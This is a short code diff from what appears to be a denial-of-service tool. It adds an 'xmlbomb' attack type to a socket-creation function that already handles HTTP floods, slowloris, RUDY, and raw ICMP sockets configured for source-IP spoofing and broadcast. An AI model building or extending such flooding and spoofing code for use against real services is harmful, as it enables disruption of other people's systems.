@@ -17,7 +17,7 @@ def create_socket(attackname):
                 sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
                 sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)  # allow modifying source IP
                 sock.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)  # allow broadcast IP as a destination
-            case ("httpgetflood" | "httppostflood" | "httpheadflood"):
+            case ("httpgetflood" | "httppostflood" | "httpheadflood" | "xmlbomb"):
                 sock = socket(AF_INET, SOCK_STREAM)
             case ("slowloris" | "rudy"):
                 sock = socket(AF_INET, SOCK_STREAM)
